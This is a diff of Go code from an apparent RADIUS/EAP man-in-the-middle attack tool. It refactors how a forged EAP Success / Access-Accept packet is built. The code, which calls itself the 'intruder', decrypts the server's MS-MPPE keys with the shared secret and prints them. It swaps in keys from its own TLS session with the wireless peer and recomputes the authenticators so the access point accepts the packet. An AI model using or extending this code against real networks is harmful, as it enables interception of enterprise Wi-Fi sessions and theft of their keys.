@@ -201,87 +201,10 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 
 			//Success message. We need to modify some fields...
 			if eapHeader.GetCode() == eap.EAPSuccess {
-				eapHeader.SetId(context.GetLastNASEapId() + 1)
 
-				if ok, encodedPEAP := eapHeader.Encode(); ok {
-					manglePacket.SetEAPMessage(encodedPEAP)
-					//If we receive a Access Accept message, recalculate the authenticator field to make it valid to the NAS.
-					//We must also modify the IDs of the messages
-					if manglePacket.GetCode() == radius.AccessAccept {
+				//Delegate the modifications to this function
+				processEapSuccessResponse(context, &eapHeader, manglePacket)
 
-						var sndKeyAttr, rcvKeyAttr []byte
-
-						//Obtain the MPPE keys
-						if ok, rcvKey := manglePacket.GetMSMPPERecvKey(); ok {
-							fmt.Println("Recv key")
-							fmt.Println(hex.Dump(rcvKey))
-
-							//Decrypt key
-							fmt.Println("Decrypt recv key:")
-							if ok, decryptedRcvKey := radius.DecryptKeyFromMPPE(rcvKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
-								fmt.Println(hex.Dump(decryptedRcvKey))
-
-								//This key is based in TLS session between us and Radius Server which differs
-								//from the TLS session created between NAS and us.
-
-								//Take our previously calculated TLS key in TLS session between NAS and us
-								derivedKey := context.GetDerivedKey()
-
-								//Encrypt it to resend the key to the NAS
-								if ok, encryptedRcvKey := radius.EncryptKeyToMPPE(derivedKey[:32],
-									context.GetLastAuthMsg(), context.GetSecret()); ok {
-									rcvKeyAttr = encryptedRcvKey
-
-								}
-
-							} else {
-								fmt.Println("Failed")
-
-							}
-
-						}
-
-						if ok, sndKey := manglePacket.GetMSMPPESendKey(); ok {
-							fmt.Println("Send key")
-							fmt.Println(hex.Dump(sndKey))
-
-							//Decrypt key
-							fmt.Println("Decrypt send key:")
-							if ok, decryptedSndKey := radius.DecryptKeyFromMPPE(sndKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
-								fmt.Println(hex.Dump(decryptedSndKey))
-
-								//This key is based in TLS session between us and Radius Server which differs
-								//from the TLS session created between NAS and us.
-
-								//Take our previously calculated TLS key in TLS session between NAS and us
-								derivedKey := context.GetDerivedKey()
-
-								//Encrypt it to resend the key to the NAS
-								if ok, encryptedSndKey := radius.EncryptKeyToMPPE(derivedKey[32:64],
-									context.GetLastAuthMsg(), context.GetSecret()); ok {
-									sndKeyAttr = encryptedSndKey
-
-								}
-
-							} else {
-								fmt.Println("Failed")
-
-							}
-						}
-
-						if sndKeyAttr != nil && rcvKeyAttr != nil {
-							manglePacket.SetMSMPPEKeys(sndKeyAttr, rcvKeyAttr)
-						}
-
-						manglePacket.SetId(context.GetLastNASMsgId())
-						radius.RecalculateMsgAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret())
-
-						if ok, auth := radius.CalculateResponseAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret()); ok {
-							manglePacket.SetAuthenticator(auth)
-						}
-
-					}
-				}
 			}
 
 			if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
@@ -912,6 +835,114 @@ func manageMsChapV2(packet *eap.EapMSCHAPv2, context *session.ContextInfo) {
 
 		}
 
+	}
+
+}
+
+//processEapSuccessResponse will process the EAP success reponse message from the server and
+// recalculate the fields necessary for the NAS to consider the packet as valid
+
+//context is the context of the current authenticating peer and server
+func processEapSuccessResponse(context *session.ContextInfo, eapHeader *eap.HeaderEap, manglePacket *radius.RadiusPacket) {
+
+	//From the context, retrieve the last EAP msg ID received from the authenticating peer to answer it back with the correct ID.
+	//As we are doing the requests, is our task to increase in one the ID, so that the peer will reponse with the same ID.
+	eapHeader.SetId(context.GetLastNASEapId() + 1)
+
+	//Encode again the EAP success message to be included in our fake crafted packet
+	if ok, encodedEAP := eapHeader.Encode(); ok {
+
+		//Inside the original radius packet, the EAP message is reinserted as part of the
+		//attributes of the RADIUS message (fragmented if necessary).
+		manglePacket.SetEAPMessage(encodedEAP)
+
+		//If we receive a Access Accept message, recalculate the authenticator field to make it valid to the NAS.
+		//We must also modify the IDs of the RADIUS message
+		if manglePacket.GetCode() == radius.AccessAccept {
+
+			var sndKeyAttr, rcvKeyAttr []byte
+
+			//Obtain the MPPE receive key
+			if ok, rcvKey := manglePacket.GetMSMPPERecvKey(); ok {
+				fmt.Println("Recv key")
+				fmt.Println(hex.Dump(rcvKey))
+
+				//Decrypt key
+				fmt.Println("Decrypt recv key:")
+				if ok, decryptedRcvKey := radius.DecryptKeyFromMPPE(rcvKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
+					fmt.Println(hex.Dump(decryptedRcvKey))
+
+					//This key is based in TLS session between us and Radius Server which differs
+					//from the TLS session created between the wireless peer and us.
+
+					//Take our previously derived key calculated after the TLS 4-way handshake process between peer and us (intruder)
+					derivedKey := context.GetDerivedKey()
+
+					//Encrypt it to resend the key to the NAS. The NAS must decode and obtain the
+					//same keys that the peer has generated from the 4-way handhake process between us and the peer.
+					if ok, encryptedRcvKey := radius.EncryptKeyToMPPE(derivedKey[:32],
+						context.GetLastAuthMsg(), context.GetSecret()); ok {
+						rcvKeyAttr = encryptedRcvKey
+
+					}
+
+				} else {
+					fmt.Println("Failed")
+
+				}
+
+			}
+
+			//Obtain the MPPE send key
+			if ok, sndKey := manglePacket.GetMSMPPESendKey(); ok {
+				fmt.Println("Send key")
+				fmt.Println(hex.Dump(sndKey))
+
+				//Decrypt key
+				fmt.Println("Decrypt send key:")
+				if ok, decryptedSndKey := radius.DecryptKeyFromMPPE(sndKey, context.GetLastGenAuthMsg(), context.GetSecret()); ok {
+					fmt.Println(hex.Dump(decryptedSndKey))
+
+					//This key is based in TLS session between us and Radius Server which differs
+					//from the TLS session created between the wireless peer and us.
+
+					//Take our previously derived key calculated after the TLS 4-way handshake process between peer and us (intruder)
+					derivedKey := context.GetDerivedKey()
+
+					//Encrypt it to resend the key to the NAS. The NAS must decode and obtain the
+					//same keys that the peer has generated from the 4-way handhake process between us and the peer.
+					if ok, encryptedSndKey := radius.EncryptKeyToMPPE(derivedKey[32:64],
+						context.GetLastAuthMsg(), context.GetSecret()); ok {
+						sndKeyAttr = encryptedSndKey
+
+					}
+
+				} else {
+					fmt.Println("Failed")
+
+				}
+			}
+
+			//Update the MPPE attributes (vendor specific from Microsoft) with the correct key values derived from the TLS handshake.
+			if sndKeyAttr != nil && rcvKeyAttr != nil {
+				manglePacket.SetMSMPPEKeys(sndKeyAttr, rcvKeyAttr)
+			}
+
+			//Modify the current RADIUS ID for the message with the last ID received from the NAS so that
+			//the message is well interpreted by the NAS.
+			manglePacket.SetId(context.GetLastNASMsgId())
+
+			//Once all the fields have been recalculated, one need to update also the
+			//correct message-authenticator attribute.
+			radius.RecalculateMsgAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret())
+
+			//Finally, update the response authenticator based on a hash applied to the whole content of
+			//the message by making use also of the secret shared between NAS and RADIUS server.
+			if ok, auth := radius.CalculateResponseAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret()); ok {
+				manglePacket.SetAuthenticator(auth)
+			}
+
+		}
 	}
 
 }
